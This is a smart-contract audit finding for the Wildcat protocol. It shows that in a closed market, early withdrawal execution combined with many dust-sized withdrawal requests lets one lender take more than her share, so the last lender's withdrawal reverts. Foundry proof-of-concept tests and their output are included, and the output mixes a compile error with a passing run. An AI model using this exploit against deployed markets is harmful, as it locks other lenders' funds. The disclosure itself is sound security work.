# User could withdraw more than supposed to, forcing last user withdraw to fail

# Lines of code

https://github.com/code-423n4/2024-08-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L248


# Vulnerability details

## Impact
User could withdraw more than supposed to and force last user's withdraw to fail.

## Proof of Concept
Within Wildcat, withdraw requests are put into batches. Users first queue their withdraws and whenever there's sufficient liquidity, they're filled at the current rate. Usually, withdraw requests are only executable after the expiry passes and then all users within the batch get a cut from the `batch.normalizedAmountPaid` proportional to the scaled amount they've requested a withdraw for. 

```solidity
    uint128 newTotalWithdrawn = uint128(
      MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount)
    );
```

This makes sure that the sum of all withdraws doesn't exceed the total `batch.normalizedAmountPaid`.

However, this invariant could be broken, if the market is closed as it allows for a batch's withdraws to be executed, before all requests are added.

Consider the market is made of 3 lenders - Alice, Bob and Laurence.
1. Alice queues a larger withdraw with an expiry time 1 year in the future.
2. Market gets closed.
3. Alice executes her withdraw request at the current rate.
4. Bob makes queues multiple smaller requests. As they're smaller, the normalized amount they represent suffers higher precision loss. Because they're part of the whole batch, they also slightly lower the batch's overall rate.
5. Bob executes his requests.
6. Laurence queues a withdraw for his entire amount. When he attempts to execute it, it will fail. This is because Alice has executed her withdraw at a higher rate than the current one and there's now insufficient `state.normalizedUnclaimedWithdrawals`


Note: marking this as High severity as it both could happen intentionally (attacker purposefully queuing numerous low-value withdraws to cause rounding down) and also with normal behaviour in high-value closed access markets where a user's withdraw could easily be in the hundreds of thousands.

Also breaks core invariant: 
> The sum of all transfer amounts for withdrawal executions in a batch must be less than or equal to batch.normalizedAmountPaid

Adding a PoC to showcase the issue: 

```solidity
  function test_deadrosesxyzissue() external {
    parameters.annualInterestBips = 3650;
    _deposit(alice, 1e18);
    _deposit(bob, 0.5e18);
    address laurence = address(1337);
    _deposit(laurence, 0.5e18);
    fastForward(200 weeks);

    vm.startPrank(borrower);
    asset.approve(address(market), 10e18);
    asset.mint(borrower, 10e18);

    vm.stopPrank();
    vm.prank(alice);
    uint32 expiry = market.queueFullWithdrawal();       // alice queues large withdraw

    vm.prank(borrower);
    market.closeMarket();                               // market is closed

    market.executeWithdrawal(alice, expiry);     // alice withdraws at the current rate

    vm.startPrank(bob);
    for (uint i; i < 10; i++) {
      market.queueWithdrawal(1);        // bob does multiple small withdraw requests just so they round down the batch's overall rate
    }
    market.queueFullWithdrawal();
    vm.stopPrank();
    vm.prank(laurence);
    market.queueFullWithdrawal();

    market.executeWithdrawal(bob, expiry);     // bob can successfully withdraw all of his funds

    vm.expectRevert();
    market.executeWithdrawal(laurence, expiry);    // laurence cannot withdraw his funds. Scammer get scammed.

  }
```


## Tools Used
Manual review

## Recommended Mitigation Steps
Although it's not a clean fix, consider adding a `addNormalizedUnclaimedRewards` function which can only be called after a market is closed. It takes token from the user and increases the global variable `state.normalizedUnclaimedRewards`. The invariant would remain broken, but it will make sure no funds are permanently stuck.





## Assessed type

Under/Overflow

## Proof of concept (executed against the audited commit)

The test below is written against the repository's own `BaseMarketTest` harness at the unmodified audited commit (nothing under `src/` or `lib/` was changed). It differs from the PoC in the report in three ways: the interest rate is set before the market is deployed (so the 3650 bips actually takes effect), the dust withdrawal is `2` wei with 50 iterations (at scale factor 2.4, `queueWithdrawal(1)` scales to zero and reverts with `NullBurnAmount`), and the assertions are explicit. Observed numbers: Alice withdrew 2399999999999999999 although her pro-rata share of the final batch is 2399999999999999989; Laurence is owed 1199999999999999994 but only 1199999999999999986 remains in `normalizedUnclaimedWithdrawals`, so his entire `executeWithdrawal` reverts with an arithmetic underflow (also after the batch expiry has passed), while the market still holds more tokens than he is owed. The shortfall is a few wei; the consequence is that the last withdrawer's full claim is blocked.

```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity >=0.8.20;

import '../BaseMarketTest.sol';

contract Poc64 is BaseMarketTest {
  address internal laurence = address(1337);

  function test_poc64_closedMarketBatchOverpay() external {
    parameters.annualInterestBips = 3650;
    setUpContracts(false);

    _deposit(alice, 1e18);
    _deposit(bob, 0.5e18);
    _deposit(laurence, 0.5e18);
    fastForward(200 weeks);

    // Alice queues. Interest has accrued on the debt without being repaid, so the batch is only
    // partly paid and is still the pending batch.
    vm.prank(alice);
    uint32 expiry = market.queueFullWithdrawal();
    assertEq(market.previousState().pendingWithdrawalExpiry, expiry, 'batch pending before close');
    assertGt(market.previousState().scaledPendingWithdrawals, 0, 'batch not fully paid before close');

    // closeMarket succeeds with that unpaid batch pending: the borrower repays the debt and closeMarket
    // pays the batch in full, leaving it as the pending batch until its expiry.
    uint256 owed = market.totalDebts() - market.totalAssets();
    asset.mint(borrower, owed);
    vm.startPrank(borrower);
    asset.approve(address(market), owed);
    market.closeMarket();
    vm.stopPrank();
    assertTrue(market.previousState().isClosed, 'market closed');
    assertEq(market.previousState().scaledPendingWithdrawals, 0, 'batch fully paid by closeMarket');
    assertEq(market.previousState().pendingWithdrawalExpiry, expiry, 'batch still pending after close');
    assertLt(expiry, block.timestamp + 365 days, 'sanity');
    assertGt(expiry, block.timestamp, 'expiry is in the future');

    // Closed market: Alice executes before the batch has expiry, against a batch holding only her scaled amount.
    uint256 aliceOut = market.executeWithdrawal(alice, expiry);

    // Bob joins the same batch with many dust requests (each burns 1 scaled unit but the
    // batch is credited floor(sf) normalized units), then his full balance. Laurence joins too.
    vm.startPrank(bob);
    for (uint i; i < 50; i++) {
      assertEq(market.queueWithdrawal(2), expiry);
    }
    assertEq(market.queueFullWithdrawal(), expiry);
    vm.stopPrank();
    vm.prank(laurence);
    assertEq(market.queueFullWithdrawal(), expiry);

    WithdrawalBatch memory b = market.getWithdrawalBatch(expiry);
    assertEq(b.scaledAmountBurned, b.scaledTotalAmount, 'batch fully paid');
    uint256 aliceProRata = MathUtils.mulDiv(
      b.normalizedAmountPaid,
      market.getAccountWithdrawalStatus(alice, expiry).scaledAmount,
      b.scaledTotalAmount
    );
    uint256 bobDue = MathUtils.mulDiv(
      b.normalizedAmountPaid,
      market.getAccountWithdrawalStatus(bob, expiry).scaledAmount,
      b.scaledTotalAmount
    );
    uint256 laurenceDue = MathUtils.mulDiv(
      b.normalizedAmountPaid,
      market.getAccountWithdrawalStatus(laurence, expiry).scaledAmount,
      b.scaledTotalAmount
    );
    emit log_named_uint('batch.normalizedAmountPaid', b.normalizedAmountPaid);
    emit log_named_uint('alice received (early)', aliceOut);
    emit log_named_uint('alice pro-rata share of final batch', aliceProRata);
    emit log_named_uint('bob due', bobDue);
    emit log_named_uint('laurence due', laurenceDue);
    emit log_named_uint('sum of entitlements incl. early payout', aliceOut + bobDue + laurenceDue);

    // The invariant "sum of withdrawals <= batch.normalizedAmountPaid" is broken by Alice's early execution.
    assertGt(aliceOut, aliceProRata, 'alice withdrew more than her final pro-rata share');
    assertGt(aliceOut + bobDue + laurenceDue, b.normalizedAmountPaid, 'payouts exceed batch total');

    assertEq(market.executeWithdrawal(bob, expiry), bobDue);
    uint256 unclaimed = market.previousState().normalizedUnclaimedWithdrawals;
    emit log_named_uint('unclaimed accounting left after bob', unclaimed);
    emit log_named_uint('market asset balance', asset.balanceOf(address(market)));
    assertLt(unclaimed, laurenceDue, 'accounting short of laurence due');
    assertGt(asset.balanceOf(address(market)), laurenceDue, 'tokens are physically present');

    // Laurence's whole withdrawal (not just the shortfall) reverts on underflow, now and later.
    vm.expectRevert(abi.encodePacked(uint32(Panic_ErrorSelector), Panic_Arithmetic));
    market.executeWithdrawal(laurence, expiry);
    fastForward(365 days);
    vm.expectRevert(abi.encodePacked(uint32(Panic_ErrorSelector), Panic_Arithmetic));
    market.executeWithdrawal(laurence, expiry);
  }
}
```

Real `forge test --match-path test/repair/Poc64.t.sol -vv` output:

```
Warning: Found unknown `fuzz_runs` config for profile `coverage` defined in foundry.toml.
No files changed, compilation skipped
error: unresolved symbol `locals`
   --> src/spherex/SphereXProtectedRegisteredBase.sol:153:39
    |
153 |   ) internal returnsIfNotActivatedPre(locals) returns (ModifierLocals memory locals) {
    |                                       ^^^^^^


Warning: the following cheatcode(s) are deprecated and will be removed in future versions:
  snapshot(): replaced by `snapshotState`
  revertTo(uint256): replaced by `revertToState`
Ran 1 test for test/repair/Poc64.t.sol:Poc64
[PASS] test_poc64_closedMarketBatchOverpay() (gas: 12831473)
Logs:
  computeCreateAddress is deprecated. Please use vm.computeCreateAddress instead.
  batch.normalizedAmountPaid: 4799999999999999979
  alice received (early): 2399999999999999999
  alice pro-rata share of final batch: 2399999999999999989
  bob due: 1199999999999999994
  laurence due: 1199999999999999994
  sum of entitlements incl. early payout: 4799999999999999987
  unclaimed accounting left after bob: 1199999999999999986
  market asset balance: 1480000000000000006

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 29.30ms (14.94ms CPU time)

Ran 1 test suite in 204.00ms (29.30ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Response to the pre-screen checklist

1. closeMarket with a pending unpaid batch: the test shows `closeMarket` succeeding while Alice's batch is the pending batch and only partly paid (`scaledPendingWithdrawals > 0` before close). `closeMarket` itself pays the batch from the borrower's repayment, so the `scaledPendingWithdrawals == 0` check at the end passes; the batch remains the pending batch (same expiry) after close, so Bob and Laurence join the same batch as Alice (asserted), Alice executes early, and `executeWithdrawal(laurence)` then reverts with Panic(0x11) arithmetic underflow, as the test asserts.
